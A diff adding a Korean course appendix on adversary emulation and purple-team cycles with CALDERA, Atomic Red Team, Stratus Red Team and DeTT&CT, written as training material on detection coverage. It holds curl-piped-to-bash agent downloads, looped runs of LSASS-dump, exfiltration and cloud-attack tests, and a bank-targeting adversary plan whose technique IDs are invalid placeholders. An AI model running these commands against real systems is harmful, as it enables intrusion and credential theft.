@@ -895,3 +895,352 @@ graph LR
 
 **학생 액션**: Red Team 5인 도구 분담.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course12 — Week 10 APT 캠페인 시뮬)
+
+### lab step → 도구 매핑
+
+| step | 학습 항목 | OSS 도구 |
+|------|----------|---------|
+| s1 | CALDERA (MITRE) | CALDERA + sandcat agent |
+| s2 | Atomic Red Team | atomic-red-team + invoke |
+| s3 | Stratus Red Team (cloud) | stratus |
+| s4 | Prelude Operator OSS | Prelude Operator |
+| s5 | InfectionMonkey | InfectionMonkey |
+| s6 | Custom adversary | CALDERA YAML |
+| s7 | Purple team cycle | CALDERA + Wazuh + Sigma |
+| s8 | DeTT&CT coverage | DeTT&CT |
+
+### 학생 환경 준비
+
+```bash
+# === CALDERA (MITRE adversary emulation, 가장 종합) ===
+git clone https://github.com/mitre/caldera --recursive ~/caldera
+cd ~/caldera && pip install -r requirements.txt
+python3 server.py --insecure                              # http://localhost:8888
+# 기본 admin/admin
+
+# === Atomic Red Team (T-code 기반 단순) ===
+git clone https://github.com/redcanaryco/atomic-red-team ~/atomic
+pip install pyinvoke
+sudo invoke install-atomicredteam
+
+# === Stratus Red Team (cloud emulation, Datadog OSS) ===
+go install github.com/datadog/stratus-red-team/v2/cmd/stratus@latest
+# 또는:
+docker pull ghcr.io/datadog/stratus-red-team:latest
+
+# === Prelude Operator OSS (modern adversary platform) ===
+# https://github.com/preludeorg/operator
+# OSS 라이센스 일부
+
+# === InfectionMonkey (Guardicore) ===
+git clone https://github.com/guardicore/monkey ~/monkey
+
+# === DeTT&CT (coverage 측정) ===
+git clone https://github.com/rabobank-cdc/DeTTECT ~/dettect
+cd ~/dettect && pip install -r requirements.txt
+```
+
+### CALDERA — 본격 APT 시뮬 (built-in 50+)
+
+```bash
+# === 1. Server 시작 ===
+cd ~/caldera
+python3 server.py --insecure                              # http://localhost:8888
+
+# === 2. Adversary profiles (built-in) ===
+# Web UI → Adversaries
+# 50+ APT/threat actor:
+# - APT29 (Cozy Bear, Russia)
+# - APT28 (Fancy Bear, Russia)
+# - APT41 (China)
+# - APT10 (Stone Panda, China)
+# - Lazarus (NK)
+# - Carbanak / FIN7
+# - Conti (Ransomware)
+# - Wizard Spider
+# - Sandworm (Russia, Olympic Destroyer)
+
+# === 3. Sandcat agent 배포 ===
+# Linux:
+curl -s -X POST -H "file:sandcat.go" -H "platform:linux" \
+    -H "server:http://caldera:8888" \
+    http://caldera:8888/file/download | bash
+
+# Windows:
+# powershell -W h -nop -enc <base64>
+
+# macOS:
+curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" \
+    http://caldera:8888/file/download | bash
+
+# === 4. Operation 시작 (REST API) ===
+curl -X POST http://localhost:8888/api/v2/operations \
+    -H "KEY: ADMIN123" \
+    -H "Content-Type: application/json" \
+    -d '{
+        "name": "APT29 Sim 2026-Q2",
+        "adversary": {"adversary_id": "0f4c3c67-845e-49a0-927e-90ed33c044e0"},
+        "group": "linux",
+        "planner": {"planner_id": "atomic"},
+        "auto_close": false,
+        "obfuscator": "plain-text",
+        "jitter": "4/8"
+    }'
+
+# === 5. Operation status 모니터 ===
+curl http://localhost:8888/api/v2/operations \
+    -H "KEY: ADMIN123" | \
+    jq '.[] | {name, state, completed_tasks: (.completed_tasks | length)}'
+
+# === 6. 완료 후 결과 ===
+curl http://localhost:8888/api/v2/operations/<op_id>/report \
+    -H "KEY: ADMIN123" \
+    -H "Content-Type: application/json" \
+    -d '{"enable_agent_output": true}'
+```
+
+### Custom adversary YAML 작성
+
+```yaml
+# ~/caldera/data/adversaries/custom-banking-apt.yml
+id: custom-banking-apt-2026
+name: 자체 위협 시나리오 — 한국 금융 표적
+description: |
+  Phishing → Local exploitation → Lateral → AD compromise → Exfil
+  
+  실제 위협 모델 기반:
+  - 1차: 공급망 (Trojan SW update)
+  - 2차: 내부 phishing (다른 부서 사칭)
+  - 3차: 자격증명 탈취 + lateral
+  - 4차: 도메인 컨트롤러 침해
+  - 5차: 데이터 exfil (DNS tunnel)
+
+atomic_ordering:
+  # === Phase 1: Initial Access ===
+  - 6f4ff2b6-5e0e-4b3f-9e0e-1234567890ab            # T1566.001 Phishing Attachment
+  - 7f4ff2b6-5e0e-4b3f-9e0e-1234567890ac            # T1078.002 Domain Accounts
+  
+  # === Phase 2: Execution ===
+  - 8f4ff2b6-5e0e-4b3f-9e0e-1234567890ad            # T1059.001 PowerShell
+  - 9f4ff2b6-5e0e-4b3f-9e0e-1234567890ae            # T1059.003 Windows Cmd Shell
+  
+  # === Phase 3: Persistence ===
+  - af4ff2b6-5e0e-4b3f-9e0e-1234567890af            # T1547.001 Boot/Logon Autostart
+  - bf4ff2b6-5e0e-4b3f-9e0e-1234567890b0            # T1098 Account Manipulation
+  - cf4ff2b6-5e0e-4b3f-9e0e-1234567890b1            # T1505.003 Web Shell
+  
+  # === Phase 4: Privilege Escalation ===
+  - df4ff2b6-5e0e-4b3f-9e0e-1234567890b2            # T1548.002 Bypass UAC
+  - ef4ff2b6-5e0e-4b3f-9e0e-1234567890b3            # T1068 Exploit Privesc
+  
+  # === Phase 5: Defense Evasion ===
+  - ff4ff2b6-5e0e-4b3f-9e0e-1234567890b4            # T1027 Obfuscated Files
+  - 1f4ff2b6-5e0e-4b3f-9e0e-1234567890b5            # T1070.004 File Deletion
+  - 2f4ff2b6-5e0e-4b3f-9e0e-1234567890b6            # T1218 Signed Binary Proxy
+  
+  # === Phase 6: Credential Access ===
+  - 3f4ff2b6-5e0e-4b3f-9e0e-1234567890b7            # T1003.001 LSASS Memory
+  - 4f4ff2b6-5e0e-4b3f-9e0e-1234567890b8            # T1003.008 /etc/passwd /etc/shadow
+  - 5f4ff2b6-5e0e-4b3f-9e0e-1234567890b9            # T1110.003 Password Spraying
+  
+  # === Phase 7: Discovery ===
+  - 6g4ff2b6-5e0e-4b3f-9e0e-1234567890c0            # T1018 Remote System Discovery
+  - 7g4ff2b6-5e0e-4b3f-9e0e-1234567890c1            # T1057 Process Discovery
+  - 8g4ff2b6-5e0e-4b3f-9e0e-1234567890c2            # T1083 File/Directory Discovery
+  
+  # === Phase 8: Lateral Movement ===
+  - 9g4ff2b6-5e0e-4b3f-9e0e-1234567890c3            # T1021.001 Remote Desktop Protocol
+  - ag4ff2b6-5e0e-4b3f-9e0e-1234567890c4            # T1021.004 SSH
+  - bg4ff2b6-5e0e-4b3f-9e0e-1234567890c5            # T1021.002 SMB/Windows Admin Shares
+  
+  # === Phase 9: Collection ===
+  - cg4ff2b6-5e0e-4b3f-9e0e-1234567890c6            # T1005 Data from Local System
+  - dg4ff2b6-5e0e-4b3f-9e0e-1234567890c7            # T1039 Data from Network Share
+  - eg4ff2b6-5e0e-4b3f-9e0e-1234567890c8            # T1056.001 Keylogging
+  
+  # === Phase 10: Exfiltration ===
+  - fg4ff2b6-5e0e-4b3f-9e0e-1234567890c9            # T1041 Exfil Over C2
+  - 1h4ff2b6-5e0e-4b3f-9e0e-1234567890ca            # T1048.003 Exfil Over Unencrypted
+  
+  # === Phase 11: Impact ===
+  - 2h4ff2b6-5e0e-4b3f-9e0e-1234567890cb            # T1486 Data Encrypted (Ransomware sim)
+```
+
+### Atomic Red Team — T-code 시뮬
+
+```bash
+# === 1. 단일 technique ===
+sudo invoke run-atomic-test T1078                          # Valid Accounts
+sudo invoke run-atomic-test T1059.001                      # PowerShell
+sudo invoke run-atomic-test T1059.003                      # Windows Cmd Shell
+sudo invoke run-atomic-test T1059.004                      # Bash
+sudo invoke run-atomic-test T1110.001                      # SSH brute
+sudo invoke run-atomic-test T1003.001                      # LSASS dump
+sudo invoke run-atomic-test T1547.001                      # Boot/Logon Autostart
+sudo invoke run-atomic-test T1041                          # Exfil over C2
+
+# === 2. 시퀀스 (Kill Chain) ===
+for t in T1078 T1059.001 T1547.001 T1003.001 T1021.004 T1041; do
+    echo "=== $t ==="
+    sudo invoke run-atomic-test $t
+    sleep 30                                              # 탐지 시간 확보
+done
+
+# === 3. Cleanup ===
+sudo invoke cleanup-atomic-test T1078
+
+# === 4. 결과 → Wazuh 자동 매핑 ===
+# Wazuh rule.mitre.id 필드로 자동 매칭
+sudo jq -r 'select(.rule.mitre.id) | .rule.mitre.id' \
+    /var/ossec/logs/alerts/alerts.json | sort | uniq -c | sort -rn
+```
+
+### Stratus Red Team (Cloud — AWS/Azure/GCP/K8s)
+
+```bash
+# 사용 가능 attack 목록
+stratus list
+
+# 출력:
+# AWS:
+# - aws.persistence.iam-create-admin-user
+# - aws.exfiltration.s3-bucket-public-access
+# - aws.privilege-escalation.iam-attach-admin-policy
+# - aws.defense-evasion.cloudtrail-disable
+#
+# Azure:
+# - azure.persistence.create-guest-user
+# - azure.privilege-escalation.add-owner
+#
+# GCP:
+# - gcp.persistence.add-iam-user
+#
+# K8s:
+# - kubernetes.privilege-escalation.create-token
+# - kubernetes.persistence.create-cluster-binding
+
+# === 1. Warmup (인프라 준비) ===
+stratus warmup aws.persistence.iam-create-admin-user
+
+# === 2. Detonate (실제 공격 — CloudTrail 에 기록) ===
+stratus detonate aws.persistence.iam-create-admin-user
+
+# === 3. CloudTrail / Falco 가 탐지 시그니처 학습 ===
+aws cloudtrail lookup-events --max-results 10
+sudo journalctl -u falco | grep "Stratus"
+
+# === 4. Cleanup ===
+stratus cleanup aws.persistence.iam-create-admin-user
+
+# === 5. 모든 attack 자동 ===
+stratus list --output json | jq -r '.[].id' | while read id; do
+    echo "=== $id ==="
+    stratus warmup $id
+    stratus detonate $id
+    sleep 30
+    stratus cleanup $id
+done
+```
+
+### Purple Team Cycle (CALDERA + Wazuh + Sigma + DeTT&CT)
+
+```bash
+#!/bin/bash
+# /usr/local/bin/purple-cycle.sh
+
+# === Phase 1: Pre-test (현재 detection coverage 측정) ===
+python3 ~/dettect/dettect.py editor &                     # Web UI 에서 입력
+# (사람이 detection rules 매핑 입력)
+
+# Coverage report 생성
+python3 ~/dettect/dettect.py de -ft /opt/techniques.yaml \
+    --output-filename /tmp/pre-coverage.json
+
+# === Phase 2: Adversary 시뮬 (CALDERA APT29) ===
+# Web UI 에서 시작 (또는 API):
+OPERATION_ID=$(curl -X POST http://localhost:8888/api/v2/operations \
+    -H "KEY: ADMIN123" \
+    -d '{"name":"Q2-APT29","adversary":{"adversary_id":"apt29-id"},"group":"linux","planner":{"planner_id":"atomic"}}' | \
+    jq -r .id)
+
+echo "Operation started: $OPERATION_ID"
+# 1시간 대기
+sleep 3600
+
+# === Phase 3: Detection 측정 (Wazuh) ===
+# CALDERA 가 실행한 ATT&CK technique 목록
+EXECUTED=$(curl http://localhost:8888/api/v2/operations/$OPERATION_ID -H "KEY: ADMIN123" | \
+    jq -r '.completed_tasks[].technique.technique_id' | sort -u)
+
+# Wazuh 가 탐지한 ATT&CK
+DETECTED=$(sudo jq -r 'select(.rule.mitre.id) | .rule.mitre.id' \
+    /var/ossec/logs/alerts/alerts.json | sort -u)
+
+# Gap (executed but not detected)
+GAP=$(comm -23 <(echo "$EXECUTED") <(echo "$DETECTED"))
+echo "Detection gap: $GAP"
+
+# === Phase 4: Sigma rule 추가 (gap 항목) ===
+for tech in $GAP; do
+    # SigmaHQ catalog 에서 해당 technique rule 찾기
+    grep -rl "$tech" ~/sigma/rules/ | while read rule_file; do
+        echo "Adding rule for $tech: $rule_file"
+        sigma convert -t opensearch "$rule_file" >> /tmp/wazuh-sigma.json
+    done
+done
+
+sudo systemctl restart wazuh-manager
+
+# === Phase 5: Re-test ===
+# CALDERA 동일 operation 재실행 → 새 rule 매칭 확인
+
+# === Phase 6: Coverage report ===
+python3 ~/dettect/dettect.py de -ft /opt/techniques.yaml \
+    --output-filename /tmp/post-coverage.json
+
+# Pre vs Post 비교
+diff <(jq '.coverage' /tmp/pre-coverage.json) \
+     <(jq '.coverage' /tmp/post-coverage.json)
+```
+
+### DeTT&CT (Detection Coverage 측정)
+
+```bash
+# === 1. Web editor 시작 ===
+python3 ~/dettect/dettect.py editor                        # http://localhost:8080
+
+# === 2. 입력 (Web UI) ===
+# Tab 1: Data Sources
+# - process_creation: Falco / auditd
+# - command_line: auditd
+# - authentication_log: Wazuh
+# - network_traffic: Suricata, Zeek
+# - file_modification: Wazuh FIM, AIDE
+
+# Tab 2: Detection rules (Sigma)
+# - 각 detection rule 의 matching technique
+# - 각 rule 의 quality score (1-3)
+
+# Tab 3: ATT&CK techniques
+# - 각 technique 의 visibility score
+# - 0: No / 1: Low / 2: Medium / 3: High
+
+# === 3. Export → Navigator JSON ===
+python3 ~/dettect/dettect.py d -fd /tmp/data-sources.yaml \
+    --output-filename /tmp/dataSourceMatrix.json
+
+python3 ~/dettect/dettect.py de -ft /tmp/techniques.yaml \
+    --output-filename /tmp/techniqueMatrix.json
+
+# === 4. ATT&CK Navigator 시각화 ===
+# Navigator 에서 import:
+# - Data Source Matrix (어떤 데이터 source 가 있나)
+# - Technique Matrix (탐지 coverage)
+# - Heat map: 빨강 = 0% / 노랑 = 부분 / 초록 = 완전
+```
+
+학생은 본 10주차에서 **CALDERA + Atomic Red Team + Stratus + InfectionMonkey + DeTT&CT** 5 도구로 advanced APT 시뮬 + Purple Team cycle (시뮬 → 탐지 → gap → 보강 → 재측정) 의 OSS 표준 흐름을 익힌다.
